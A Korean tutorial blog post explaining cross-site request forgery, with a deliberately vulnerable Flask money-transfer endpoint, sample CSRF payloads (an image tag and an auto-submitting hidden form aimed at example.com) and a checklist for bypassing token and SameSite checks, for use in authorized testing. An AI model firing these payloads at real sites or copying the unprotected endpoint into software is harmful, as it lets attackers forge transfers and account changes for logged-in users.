---
title: "CSRF (Cross-Site Request Forgery)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, CSRF]
tags: [csrf, samesite, web]
description: "브라우저가 쿠키를 자동으로 붙인다는 점을 이용해 로그인 사용자 모르게 상태 변경 요청을 위조하는 CSRF의 개념과, 토큰 제거·변조·메서드 변경 등 확인 구문을 정리합니다."
mermaid: true
---

> CSRF는 **브라우저가 해당 도메인의 쿠키를 자동으로 붙여 보낸다는 점**을 이용해, 로그인한 사용자 모르게 상태 변경 요청을 보내게 만드는 공격이다. 공격자는 응답을 읽을 필요가 없다. 상태가 바뀌는 것 자체가 목적이다.

## 개념

사용자가 서비스에 로그인한 상태에서 공격자 페이지를 방문하면, 그 페이지가 서비스로 요청을 보내게 만들 수 있다. 브라우저는 서비스 도메인 쿠키를 자동으로 첨부하므로, 서버는 정상 로그인 요청으로 처리한다.

```python
@app.route("/transfer", methods=["GET", "POST"])
def transfer():
    user = session["user"]
    to = request.values["to"]          # GET 쿼리도 받아 줌
    amount = int(request.values["amount"])
    do_transfer(user, to, amount)      # 요청 출처 검증 없음
```

성립 조건은 세 가지다. ① 쿠키 기반 인증(브라우저가 자동 전송), ② 상태 변경 엔드포인트(송금·비밀번호/이메일 변경 등), ③ 요청 값을 공격자가 알 수 있음. 특히 상태 변경을 `GET`으로 처리하거나, 토큰을 발급만 하고 **서버가 검증하지 않으면** 바로 성립한다. XSS가 있으면 토큰을 읽어 가므로 CSRF는 XSS와 함께 본다.

## 공격·우회 구문

허가된 계정·테스트 환경에서만 한다.

### GET 상태 변경 (가장 단순)

상태 변경이 `GET`으로 되면 이미지 로딩만으로 실행된다.

```html
<img src="https://example.com/transfer?to=attacker&amount=1000000">
```

### 자동 제출 폼 (POST)

```html
<form action="https://example.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit()</script>
```

### 토큰 검증 확인

```
토큰 제거: csrf 파라미터·헤더를 빼고 재전송 → 성공하면 서버 검증 없음
토큰 변조: 값을 아무 문자열로 바꿔 전송 → 거부되는지
타 계정 토큰: 계정 A 토큰을 계정 B 세션에 사용 → 통과하면 세션에 안 묶임
토큰 생성 관찰: 여러 번 발급해 사용자명·시각·IP 기반 해시인지(예측 가능하면 위조)
```

### 메서드·SameSite 우회

```
POST → GET 으로 바꿔도 처리되는지 (SameSite=Lax는 최상위 GET에 쿠키 보냄)
Content-Type 변경: application/json → text/plain 으로 단순 요청화
서브도메인·오픈 리다이렉트로 same-site 취급 유도
```

## 참고 자료

- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
